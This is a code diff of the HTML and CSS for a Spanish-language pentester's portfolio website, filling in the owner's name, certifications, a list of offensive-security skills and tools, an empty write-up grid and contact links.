+.flbl{font-family:'Share Tech Mono',monospace;font-size:.62rem;color:rgba(200,224,240,.3);letter-spacing:2px;margin-right:4px;}
+.fbtn{font-family:'Share Tech Mono',monospace;font-size:.62rem;letter-spacing:1.5px;padding:5px 14px;border:1px solid var(--bd);background:transparent;color:rgba(200,224,240,.4);cursor:none;transition:all .25s;text-transform:uppercase;}
+.fbtn:hover,.fbtn.active{background:rgba(0,245,255,.06);border-color:var(--c);color:var(--c);}
+.fbtn[data-f="easy"].active{border-color:var(--g);color:var(--g);background:rgba(0,255,136,.05);}
+.fbtn[data-f="medium"].active{border-color:var(--o);color:var(--o);background:rgba(255,140,0,.05);}
+.fbtn[data-f="hard"].active{border-color:var(--m);color:var(--m);background:rgba(255,0,200,.05);}
+.srchw{position:relative;margin-left:auto;}
+.srchi{font-family:'Share Tech Mono',monospace;font-size:.65rem;padding:6px 12px 6px 30px;background:rgba(0,245,255,.025);border:1px solid var(--bd);color:var(--tx);outline:none;transition:border-color .25s;width:190px;}
+.srchi:focus{border-color:var(--c);}
+.srchico{position:absolute;left:9px;top:50%;transform:translateY(-50%);font-size:.68rem;color:rgba(200,224,240,.3);pointer-events:none;}
+.wugrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px;}
+.wucard{background:rgba(0,245,255,.03);border:1px solid var(--bd);position:relative;overflow:hidden;transition:border-color .3s,transform .3s,box-shadow .3s;cursor:none;}
+.wucard:hover{border-color:rgba(0,245,255,.35);transform:translateY(-3px);box-shadow:0 8px 36px rgba(0,245,255,.07);}
+.wuacc{height:2px;width:100%;background:linear-gradient(90deg,var(--c),var(--m));transform:scaleX(0);transform-origin:left;transition:transform .4s;}
+.wucard:hover .wuacc{transform:scaleX(1);}
+.wubody{padding:22px 24px;}
+.wutop{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:14px;}
+.diff{font-family:'Share Tech Mono',monospace;font-size:.58rem;letter-spacing:2px;padding:3px 9px;border:1px solid;text-transform:uppercase;}
+.de{color:var(--g);border-color:rgba(0,255,136,.35);background:rgba(0,255,136,.04);}
+.dm{color:var(--o);border-color:rgba(255,140,0,.35);background:rgba(255,140,0,.04);}
+.dh{color:var(--m);border-color:rgba(255,0,200,.35);background:rgba(255,0,200,.04);}
+.wuplat{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:rgba(200,224,240,.3);}
+.wutitle{font-family:'Orbitron',monospace;font-size:.95rem;font-weight:600;color:#fff;margin-bottom:10px;}
+.wutags{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:14px;}
+.wutag{font-family:'Share Tech Mono',monospace;font-size:.56rem;padding:2px 7px;background:rgba(123,47,255,.1);border:1px solid rgba(123,47,255,.2);color:rgba(200,224,240,.45);}
+.wuexc{font-size:.8rem;font-weight:300;line-height:1.6;color:rgba(200,224,240,.45);margin-bottom:18px;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+.wufoot{display:flex;justify-content:space-between;align-items:center;}
+.wudate{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:rgba(200,224,240,.22);}
+.wubtn{font-family:'Orbitron',monospace;font-size:.6rem;font-weight:600;letter-spacing:2px;padding:7px 16px;border:1px solid var(--c);background:transparent;color:var(--c);cursor:none;position:relative;overflow:hidden;transition:color .25s;text-transform:uppercase;}
+.wubtn::before{content:'';position:absolute;inset:0;background:var(--c);transform:translateX(-100%);transition:transform .25s;z-index:-1;}
+.wubtn:hover{color:#010208;}
+.wubtn:hover::before{transform:translateX(0);}
+/* PANEL */
+.overlay{position:fixed;inset:0;background:rgba(1,2,8,.82);backdrop-filter:blur(8px);z-index:500;opacity:0;pointer-events:none;transition:opacity .4s;}
+.overlay.open{opacity:1;pointer-events:all;}
+.panel{position:fixed;top:0;right:0;width:min(820px,100vw);height:100vh;background:#050a18;border-left:1px solid var(--bd);z-index:600;transform:translateX(100%);transition:transform .5s cubic-bezier(.16,1,.3,1);display:flex;flex-direction:column;overflow:hidden;}
+.panel.open{transform:translateX(0);}
+.ptopbar{display:flex;align-items:center;justify-content:space-between;padding:18px 30px;border-bottom:1px solid var(--bd);background:rgba(0,245,255,.02);flex-shrink:0;}
+.pbc{font-family:'Share Tech Mono',monospace;font-size:.62rem;color:rgba(200,224,240,.3);letter-spacing:2px;}
+.pbc span{color:var(--c);}
+.pclose{width:34px;height:34px;border:1px solid var(--bd);background:transparent;color:rgba(200,224,240,.4);cursor:none;font-size:1rem;display:flex;align-items:center;justify-content:center;transition:all .25s;font-family:monospace;}
+.pclose:hover{border-color:var(--m);color:var(--m);}
+.phead{padding:24px 30px 20px;border-bottom:1px solid var(--bd);flex-shrink:0;background:linear-gradient(180deg,rgba(0,245,255,.025),transparent);}
+.pmeta{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap;align-items:center;}
+.ptitle{font-family:'Orbitron',monospace;font-size:1.3rem;font-weight:700;color:#fff;text-shadow:var(--gc);margin-bottom:10px;line-height:1.2;}
+.ptags{display:flex;gap:7px;flex-wrap:wrap;}
+.pprogw{height:2px;background:rgba(0,245,255,.06);flex-shrink:0;}
+.pprog{height:100%;background:linear-gradient(90deg,var(--c),var(--m));width:0%;transition:width .1s;box-shadow:0 0 8px var(--c);}
+.pcontent{flex:1;overflow-y:auto;padding:28px 30px;scrollbar-width:thin;scrollbar-color:rgba(0,245,255,.15) transparent;}
+.pcontent::-webkit-scrollbar{width:3px;}
+.pcontent::-webkit-scrollbar-thumb{background:rgba(0,245,255,.15);}
+/* ATTACK CHAIN */
+.wchain{display:flex;flex-wrap:wrap;align-items:center;gap:6px;padding:14px 16px;background:rgba(0,0,0,.35);border:1px solid var(--bd);border-left:3px solid var(--m);margin-bottom:4px;}
+.wstep{font-family:'Share Tech Mono',monospace;font-size:.62rem;padding:4px 10px;border:1px solid rgba(0,245,255,.25);color:var(--c);background:rgba(0,245,255,.05);letter-spacing:1px;white-space:nowrap;}
+.wstep.end{border-color:rgba(255,0,200,.4);color:var(--m);background:rgba(255,0,200,.06);}
+.warr{color:rgba(0,245,255,.4);font-size:.9rem;}
+/* WU CONTENT */
+.ws{margin-bottom:22px;}
+.wh{font-family:'Orbitron',monospace;font-size:.85rem;font-weight:600;color:var(--c);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--bd);}
+.ws p{font-size:.87rem;font-weight:300;color:rgba(200,224,240,.7);margin-bottom:10px;line-height:1.7;}
+.ws p b{color:rgba(200,224,240,.9);}
+.ws p code{font-family:'Share Tech Mono',monospace;font-size:.8rem;background:rgba(0,245,255,.06);border:1px solid rgba(0,245,255,.15);color:var(--c);padding:2px 6px;}
+.wcode{font-family:'Share Tech Mono',monospace;font-size:.74rem;color:rgba(200,224,240,.82);background:rgba(0,0,0,.55);border:1px solid rgba(0,245,255,.1);border-left:3px solid var(--c);padding:14px 16px;overflow-x:auto;line-height:1.75;display:block;margin:12px 0;white-space:pre;}
+.cc2{color:var(--g);}
+.co{color:rgba(200,224,240,.45);}
+.ch{color:var(--c);}
+.cf{color:var(--m);font-weight:bold;}
+.ib{background:rgba(0,245,255,.035);border:1px solid rgba(0,245,255,.12);border-left:3px solid var(--c);padding:10px 14px;margin:12px 0;font-size:.8rem;font-weight:300;color:rgba(200,224,240,.65);font-family:'Share Tech Mono',monospace;}
+.ib b{color:var(--c);}
+.wb{background:rgba(255,140,0,.03);border:1px solid rgba(255,140,0,.18);border-left:3px solid var(--o);padding:10px 14px;margin:12px 0;font-size:.8rem;color:rgba(255,180,80,.75);font-family:'Share Tech Mono',monospace;}
+.fb{background:rgba(255,0,200,.04);border:1px solid rgba(255,0,200,.22);padding:14px 18px;margin:16px 0;display:flex;align-items:center;gap:12px;animation:fpulse 3s ease-in-out infinite;}
+@keyframes fpulse{0%,100%{box-shadow:none;}50%{box-shadow:0 0 18px rgba(255,0,200,.12);}}
+.fb span{font-size:1.3rem;flex-shrink:0;}
+.fb>div{font-family:'Share Tech Mono',monospace;}
+.fb>div>b{font-size:.6rem;color:var(--m);letter-spacing:3px;text-transform:uppercase;display:block;margin-bottom:3px;}
+.fb>div>div{font-size:.78rem;color:rgba(200,224,240,.55);}
+/* PANEL ANIMATE */
+.ws{opacity:0;transform:translateX(-10px);animation:wsin .4s ease forwards;}
+@keyframes wsin{to{opacity:1;transform:translateX(0);}}
+.ws:nth-child(1){animation-delay:.05s;}
+.ws:nth-child(2){animation-delay:.12s;}
+.ws:nth-child(3){animation-delay:.19s;}
+.ws:nth-child(4){animation-delay:.26s;}
+.ws:nth-child(5){animation-delay:.33s;}
+.ws:nth-child(6){animation-delay:.40s;}
+.pbottom{padding:14px 30px;border-top:1px solid var(--bd);display:flex;justify-content:space-between;align-items:center;flex-shrink:0;background:rgba(0,0,0,.25);}
+.pnav{font-family:'Share Tech Mono',monospace;font-size:.62rem;color:rgba(200,224,240,.3);background:transparent;border:1px solid var(--bd);padding:7px 14px;cursor:none;letter-spacing:1px;transition:all .25s;}
+.pnav:hover:not(:disabled){border-color:var(--c);color:var(--c);}
+.pnav:disabled{opacity:.2;}
+.pctr{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:rgba(200,224,240,.22);letter-spacing:2px;}
+.pctr span{color:var(--c);}
+/* CONTACT */
+.ctinner{max-width:580px;margin:0 auto;text-align:center;}
+.ctdesc{font-size:.95rem;font-weight:300;line-height:1.8;color:rgba(200,224,240,.55);margin-bottom:44px;}
+.socgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:36px;}
+.soclink{display:flex;align-items:center;justify-content:center;gap:9px;padding:14px 18px;border:1px solid var(--bd);background:rgba(0,245,255,.03);text-decoration:none;color:rgba(200,224,240,.5);font-family:'Share Tech Mono',monospace;font-size:.68rem;letter-spacing:2px;text-transform:uppercase;transition:all .3s;}
+.soclink:hover{border-color:var(--c);color:var(--c);box-shadow:var(--gc);}
+.soclink svg{width:15px;height:15px;fill:currentColor;flex-shrink:0;}
+.emailbtn{display:inline-flex;align-items:center;gap:10px;font-family:'Orbitron',monospace;font-size:.7rem;font-weight:600;letter-spacing:3px;text-transform:uppercase;padding:16px 44px;border:1px solid var(--m);color:var(--m);text-decoration:none;position:relative;overflow:hidden;transition:color .3s;}
+.emailbtn::before{content:'';position:absolute;inset:0;background:var(--m);transform:translateX(-100%);transition:transform .3s;z-index:-1;}
+.emailbtn:hover{color:#010208;}
+.emailbtn:hover::before{transform:translateX(0);}
+footer{text-align:center;padding:36px 56px;border-top:1px solid var(--bd);position:relative;z-index:2;}
+footer p{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:rgba(200,224,240,.2);letter-spacing:2px;}
+footer span{color:var(--c);}
+@media(max-width:768px){
+  nav{padding:14px 20px;}nav ul{display:none;}
+  #hero{padding:90px 20px 50px;}
+  .hi{grid-template-columns:1fr;gap:44px;}
+  .hphoto{order:-1;}
+  .pframe{width:190px;height:190px;}
+  .sw{padding:70px 20px;}
+  .agrid{grid-template-columns:1fr;}
+  .panel{width:100vw;}
+  .pcontent{padding:18px;}
+  .phead,.ptopbar,.pbottom{padding:14px 18px;}
+  footer{padding:28px 20px;}
+  .wchain{gap:4px;}
+  .wstep{font-size:.55rem;padding:3px 7px;}
+}
 </style>
 </head>
 <body>
-
-<!-- Custom cursor -->
-<div class="cursor" id="cursor"></div>
-<div class="cursor-ring" id="cursorRing"></div>
-
-<!-- Particles -->
-<div class="particles" id="particles"></div>
-
-<!-- NAV -->
+<div class="cur" id="cur"></div>
+<div class="cur-ring" id="curRing"></div>
+<div class="ptc" id="ptc"></div>
+<div class="overlay" id="overlay"></div>
+<div class="panel" id="panel">
+  <div class="ptopbar">
+    <div class="pbc">write-ups / <span id="pPlat">—</span></div>
+    <button class="pclose" id="pClose">✕</button>
+  </div>
+  <div class="phead">
+    <div class="pmeta"><span class="diff" id="pDiff">—</span><span class="wuplat" id="pDate">—</span></div>
+    <div class="ptitle" id="pTitle">—</div>
+    <div class="ptags" id="pTags"></div>
+  </div>
+  <div class="pprogw"><div class="pprog" id="pprog"></div></div>
+  <div class="pcontent" id="pcontent"></div>
+  <div class="pbottom">
+    <button class="pnav" id="prevBtn">← anterior</button>
+    <div class="pctr"><span id="curIdx">1</span> / <span id="totCount">1</span></div>
+    <button class="pnav" id="nextBtn">siguiente →</button>
+  </div>
+</div>
 <nav>
-  <div class="nav-logo">CYBER<span>//</span>SEC</div>
-  <ul class="nav-links">
+  <div class="nl">JOSE<span>//</span>SEC</div>
+  <ul>
     <li><a href="#about">about</a></li>
     <li><a href="#certs">certs</a></li>
-    <li><a href="#projects">projects</a></li>
     <li><a href="#writeups">write-ups</a></li>
     <li><a href="#contact">contact</a></li>
   </ul>
 </nav>
-
-<!-- HERO -->
-<section id="about" style="max-width:100%; padding:0;">
+<div id="about" style="position:relative;z-index:2;">
 <div id="hero">
-  <div class="hero-container">
-    <div class="hero-text">
-      <div class="hero-badge">disponible para proyectos</div>
-      <h1 class="hero-name glitch" data-text="TU NOMBRE">
-        TU <span class="accent">NOMBRE</span>
-      </h1>
-      <div class="hero-role typed" id="roleText">Pentester &amp; CTF Player</div>
-      <p class="hero-desc">
-        Especialista en ciberseguridad ofensiva con pasión por el ethical hacking, 
-        resolución de máquinas CTF y análisis de vulnerabilidades. Comprometido con 
-        hacer el mundo digital más seguro.
-      </p>
-      <div class="hero-btns">
-        <a href="#projects" class="btn-primary">Ver proyectos</a>
-        <a href="#contact" class="btn-secondary">Contactar</a>
+  <div class="hi">
+    <div>
+      <div class="hbadge">disponible · presencial o remoto</div>
+      <h1 class="hname">JOSÉ MANUEL<br><span class="ac">TALAVERA RUIZ</span></h1>
+      <div class="hrole" id="roleText">Pentester</div>
+      <div class="hloc">📍 Albacete, España — abierto a desplazamiento</div>
+      <p class="hdesc">Especialista en ciberseguridad ofensiva con experiencia en ethical hacking, Active Directory, CTF y análisis de vulnerabilidades. Preparando eCPPTv3 con laboratorios reales en HackTheBox y DockerLabs.</p>
+      <div class="hbtns">
+        <a href="#writeups" class="bp">Ver write-ups</a>
+        <a href="#contact" class="bs">Contactar</a>
       </div>
-      <div class="hero-stats">
-        <div class="stat-item">
-          <div class="stat-num" id="counterCerts">0</div>
-          <div class="stat-label">certificaciones</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-num" id="counterCTF">0</div>
-          <div class="stat-label">máquinas pwned</div>
-        </div>
-        <div class="stat-item">
-          <div class="stat-num" id="counterWU">0</div>
-          <div class="stat-label">write-ups</div>
-        </div>
+      <div class="hstats">
+        <div><div class="sn" id="sCerts">0</div><div class="sl">certificaciones</div></div>
+        <div><div class="sn" id="sWU">0</div><div class="sl">write-ups</div></div>
+        <div><div class="sn" id="sPwn">0</div><div class="sl">máquinas pwned</div></div>
       </div>
     </div>
-    <div class="hero-photo">
-      <div class="photo-frame">
-        <div class="photo-placeholder">
-          <!-- Reemplaza este div con: <img src="tu-foto.jpg" alt="Tu nombre"> -->
-          <div class="photo-hint">[ INSERTA TU FOTO AQUÍ ]<br><br>photo.jpg</div>
-          <div class="photo-scanline"></div>
+    <div class="hphoto">
+      <div class="pframe">
+        <div class="pinner">
+          <div class="phint">[ TU FOTO AQUÍ ]<br><br>josema.jpg</div>
+          <div class="scanl"></div>
         </div>
       </div>
     </div>
   </div>
 </div>
-</section>
-
-<!-- CERTIFICACIONES -->
-<section id="certs">
-  <div class="section-header fade-in">
-    <div class="section-tag">credentials</div>
-    <div class="section-title-wrap">
-      <div class="section-num">// 01</div>
-      <h2 class="section-title">Certificaciones</h2>
-    </div>
-    <div class="section-line"></div>
+</div>
+<div id="certs"><div class="sw">
+  <div class="sh fi">
+    <div class="stag">credentials</div>
+    <div><div class="snum">// 01</div><h2 class="stitle">Certificaciones</h2></div>
+    <div class="sline"></div>
   </div>
-  <div class="certs-grid fade-in">
-    <div class="cert-card">
-      <div class="cert-status"></div>
-      <div class="cert-icon">🛡️</div>
-      <div class="cert-name">eJPT</div>
-      <div class="cert-issuer">eLearnSecurity</div>
-      <div class="cert-date">// 2024</div>
+  <div class="cgrid fi">
+    <div class="cc">
+      <div class="cdot"></div>
+      <div class="cico">🛡️</div>
+      <div class="cname">eJPT v2</div>
+      <div class="ciss">eLearnSecurity / INE</div>
+      <div class="cdate">// Nov 21, 2025</div>
+      <div class="cid">ID: 167304104</div>
+      <div class="cbadge">✓ obtenida</div>
     </div>
-    <div class="cert-card">
-      <div class="cert-status"></div>
-      <div class="cert-icon">🔴</div>
-      <div class="cert-name">CERTIFICACIÓN 2</div>
-      <div class="cert-issuer">Entidad emisora</div>
-      <div class="cert-date">// 2024</div>
+    <div class="cc">
+      <div class="cdot"></div>
+      <div class="cico">🔴</div>
+      <div class="cname">eCIR</div>
+      <div class="ciss">eLearnSecurity / INE</div>
+      <div class="cdate">// Feb 21, 2026</div>
+      <div class="cid">ID: 175101956</div>
+      <div class="cbadge">✓ obtenida</div>
     </div>
-    <div class="cert-card">
-      <div class="cert-status"></div>
-      <div class="cert-icon">⚡</div>
-      <div class="cert-name">CERTIFICACIÓN 3</div>
-      <div class="cert-issuer">Entidad emisora</div>
-      <div class="cert-date">// 2023</div>
+    <div class="cc">
+      <div class="cdot" style="background:var(--o);box-shadow:0 0 10px var(--o);"></div>
+      <div class="cico">⚔️</div>
+      <div class="cname">eCPPT v3</div>
+      <div class="ciss">eLearnSecurity / INE</div>
+      <div class="cdate">// en preparación</div>
+      <div class="cbadge" style="border-color:rgba(255,140,0,.4);color:var(--o);">⟳ en curso</div>
     </div>
-    <div class="cert-card">
-      <div class="cert-status"></div>
-      <div class="cert-icon">🎯</div>
-      <div class="cert-name">CERTIFICACIÓN 4</div>
-      <div class="cert-issuer">Entidad emisora</div>
-      <div class="cert-date">// 2023</div>
-    </div>
-  </div>
-</section>
-
-<!-- PROYECTOS -->
-<section id="projects">
-  <div class="section-header fade-in">
-    <div class="section-tag">portfolio</div>
-    <div class="section-title-wrap">
-      <div class="section-num">// 02</div>
-      <h2 class="section-title">Proyectos</h2>
-    </div>
-    <div class="section-line"></div>
-  </div>
-  <div class="projects-grid fade-in">
-    <div class="project-card">
-      <div class="project-tags">
-        <span class="tag cyan">Python</span>
-        <span class="tag mag">Pentesting</span>
-      </div>
-      <div class="project-title">Nombre del Proyecto 1</div>
-      <p class="project-desc">
-        Descripción del proyecto. Herramienta / investigación / laboratorio que desarrollaste. 
-        Explica el objetivo y lo que aprendiste.
-      </p>
-      <a href="#" class="project-link">Ver proyecto</a>
-    </div>
-    <div class="project-card">
-      <div class="project-tags">
-        <span class="tag green">Red Team</span>
-        <span class="tag">Bash</span>
-      </div>
-      <div class="project-title">Nombre del Proyecto 2</div>
-      <p class="project-desc">
-        Descripción del proyecto. Herramienta / investigación / laboratorio que desarrollaste. 
-        Explica el objetivo y lo que aprendiste.
-      </p>
-      <a href="#" class="project-link">Ver proyecto</a>
-    </div>
-    <div class="project-card">
-      <div class="project-tags">
-        <span class="tag cyan">Web Hacking</span>
-        <span class="tag mag">OWASP</span>
-      </div>
-      <div class="project-title">Nombre del Proyecto 3</div>
-      <p class="project-desc">
-        Descripción del proyecto. Herramienta / investigación / laboratorio que desarrollaste. 
-        Explica el objetivo y lo que aprendiste.
-      </p>
-      <a href="#" class="project-link">Ver proyecto</a>
+    <div class="cc">
+      <div class="cdot" style="background:var(--o);box-shadow:0 0 10px var(--o);"></div>
+      <div class="cico">🎯</div>
+      <div class="cname">OSCP</div>
+      <div class="ciss">Offensive Security</div>
+      <div class="cdate">// objetivo 2025</div>
+      <div class="cbadge" style="border-color:rgba(255,140,0,.4);color:var(--o);">⟳ objetivo</div>
     </div>
   </div>
-</section>
-
-<!-- WRITE-UPS -->
-<section id="writeups">
-  <div class="section-header fade-in">
-    <div class="section-tag">research</div>
-    <div class="section-title-wrap">
-      <div class="section-num">// 03</div>
-      <h2 class="section-title">Write-Ups</h2>
+  <div style="margin-top:52px;">
+    <div class="sh fi" style="margin-bottom:32px;">
+      <div class="stag">profile</div>
+      <div><div class="snum">// 01b</div><h2 class="stitle" style="font-size:1.3rem;">Sobre mí</h2></div>
+      <div class="sline"></div>
     </div>
-    <div class="section-line"></div>
-  </div>
-  <div class="writeups-list fade-in">
-    <div class="writeup-item">
-      <div class="writeup-difficulty diff-easy">Easy</div>
-      <div class="writeup-info">
-        <div class="writeup-title">Nombre de Máquina — HackTheBox</div>
-        <div class="writeup-meta">// Linux · Web · Privilege Escalation · 2024</div>
-      </div>
-      <a href="#" class="writeup-link">leer →</a>
-    </div>
-    <div class="writeup-item">
-      <div class="writeup-difficulty diff-medium">Medium</div>
-      <div class="writeup-info">
-        <div class="writeup-title">Nombre de Máquina — TryHackMe</div>
-        <div class="writeup-meta">// Windows · AD · Buffer Overflow · 2024</div>
-      </div>
-      <a href="#" class="writeup-link">leer →</a>
-    </div>
-    <div class="writeup-item">
-      <div class="writeup-difficulty diff-hard">Hard</div>
-      <div class="writeup-info">
-        <div class="writeup-title">Nombre de Máquina — HackTheBox</div>
-        <div class="writeup-meta">// Linux · RCE · Kernel Exploit · 2024</div>
-      </div>
-      <a href="#" class="writeup-link">leer →</a>
-    </div>
-    <div class="writeup-item">
-      <div class="writeup-difficulty diff-insane">Insane</div>
-      <div class="writeup-info">
-        <div class="writeup-title">Nombre de Máquina — HackTheBox</div>
-        <div class="writeup-meta">// Linux · Reversing · Custom Exploit · 2023</div>
-      </div>
-      <a href="#" class="writeup-link">leer →</a>
-    </div>
-    <div class="writeup-item">
-      <div class="writeup-difficulty diff-medium">Medium</div>
-      <div class="writeup-info">
-        <div class="writeup-title">CTF Challenge — NombreCTF 2024</div>
-        <div class="writeup-meta">// Web · SQL Injection · XSS · 2024</div>
-      </div>
-      <a href="#" class="writeup-link">leer →</a>
+    <div class="agrid fi">
+      <div class="acard"><div class="actitle">Stack técnico</div><div class="tags"><span class="stk">Nmap</span><span class="stk">Burp Suite</span><span class="stk">SQLMap</span><span class="stk">Metasploit</span><span class="stk">Impacket</span><span class="stk">BloodHound</span><span class="stk">Evil-WinRM</span><span class="stk">Chisel</span><span class="stk">Gobuster</span><span class="stk">Hashcat</span><span class="stk">Netcat</span><span class="stk">Kerbrute</span><span class="stk">pspy64</span><span class="stk">PowerView</span><span class="stk">bloodyAD</span><span class="stk">msfvenom</span></div></div>
+      <div class="acard"><div class="actitle">Áreas de especialización</div><div class="tags"><span class="stk">Active Directory</span><span class="stk">Web Hacking</span><span class="stk">SQL Injection</span><span class="stk">SSTI</span><span class="stk">Buffer Overflow</span><span class="stk">Docker Escape</span><span class="stk">Privilege Escalation</span><span class="stk">Kerberos Attacks</span><span class="stk">DCSync</span><span class="stk">RBCD</span><span class="stk">AS-REP Roasting</span><span class="stk">Kerberoasting</span></div></div>
     </div>
   </div>
-</section>
-
-<!-- CONTACT -->
-<section id="contact">
-  <div class="section-header fade-in" style="justify-content:center;">
-    <div class="section-title-wrap" style="text-align:center;">
-      <div class="section-num">// 04</div>
-      <h2 class="section-title">Contacto</h2>
-    </div>
+</div></div>
+<div id="writeups"><div class="sw">
+  <div class="sh fi">
+    <div class="stag">research</div>
+    <div><div class="snum">// 02</div><h2 class="stitle">Write-Ups</h2></div>
+    <div class="sline"></div>
   </div>
-  <div class="contact-wrapper fade-in">
-    <p class="contact-intro">
-      ¿Interesado en colaborar, contratar o simplemente hablar de ciberseguridad? 
-      Estoy disponible. No dudes en contactarme.
-    </p>
-    <div class="social-grid">
-      <a href="https://github.com/tu-usuario" class="social-link" target="_blank">
-        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
-        GitHub
-      </a>
-      <a href="https://linkedin.com/in/tu-usuario" class="social-link" target="_blank">
-        <svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
-        LinkedIn
-      </a>
-      <a href="https://tryhackme.com/p/tu-usuario" class="social-link" target="_blank">
-        <svg viewBox="0 0 24 24"><path d="M10.705 0C7.54 0 4.902 2.285 4.34 5.291a4.542 4.542 0 00-.705-.055C1.628 5.236 0 6.864 0 8.87s1.628 3.636 3.636 3.636h7.069C12.729 12.505 14 11.234 14 9.2V4.8C14 2.15 12.629 0 10.705 0zm7.59 5.236a4.544 4.544 0 00-.705.055C17.128 2.285 14.49 0 11.295 0H11.3c1.914.006 3.273 2.152 3.273 4.8v4.4c0 2.034 1.271 3.305 3.295 3.305h2.496C22.372 12.505 24 10.877 24 8.87s-1.628-3.634-3.636-3.634H18.295z"/></svg>
-        TryHackMe
-      </a>
-      <a href="https://app.hackthebox.com/profile/tu-id" class="social-link" target="_blank">
-        <svg viewBox="0 0 24 24"><path d="M11.996 0L3 4.969v10.062L12 20l9-4.969V4.969L11.996 0zM12 1.155l7.997 4.416v8.858L12 18.845l-7.997-4.416V5.571L12 1.155z"/></svg>
-        HackTheBox
-      </a>
-    </div>
-    <a href="mailto:tu@email.com" class="email-btn">
-      Enviar email
-    </a>
+  <div class="wfilters fi">
+    <span class="flbl">FILTRAR:</span>
+    <button class="fbtn active" data-f="all">Todos</button>
+    <button class="fbtn" data-f="easy">Easy</button>
+    <button class="fbtn" data-f="medium">Medium</button>
+    <button class="fbtn" data-f="hard">Hard</button>
+    <div class="srchw"><span class="srchico">⌕</span><input type="text" class="srchi" id="srch" placeholder="buscar máquina..."></div>
   </div>
-</section>
-
-<!-- FOOTER -->
-<footer>
-  <p>© 2025 <span>TU NOMBRE</span> — Hecho con ☠️ y muchas horas de CTF</p>
-</footer>
-
+  <div class="wugrid" id="wugrid"></div>
+</div></div>
+<div id="contact"><div class="sw">
+  <div class="sh fi" style="justify-content:center;margin-bottom:40px;">
+    <div><div class="snum" style="text-align:center;">// 03</div><h2 class="stitle">Contacto</h2></div>
+  </div>
+  <div class="ctinner fi">
+    <p class="ctdesc">¿Buscas un pentester para tu equipo o proyecto? Disponible tanto en remoto como para desplazarme. Hablemos.</p>
+    <div class="socgrid">
+      <a href="https://github.com/josematr" class="soclink" target="_blank"><svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>GitHub</a>
+      <a href="https://www.linkedin.com/in/jose-manueltr/" class="soclink" target="_blank"><svg viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>LinkedIn</a>
+      <a href="https://app.hackthebox.com/profile/josematr" class="soclink" target="_blank"><svg viewBox="0 0 24 24"><path d="M11.996 0L3 4.969v10.062L12 20l9-4.969V4.969L11.996 0zM12 1.155l7.997 4.416v8.858L12 18.845l-7.997-4.416V5.571L12 1.155z"/></svg>HackTheBox</a>
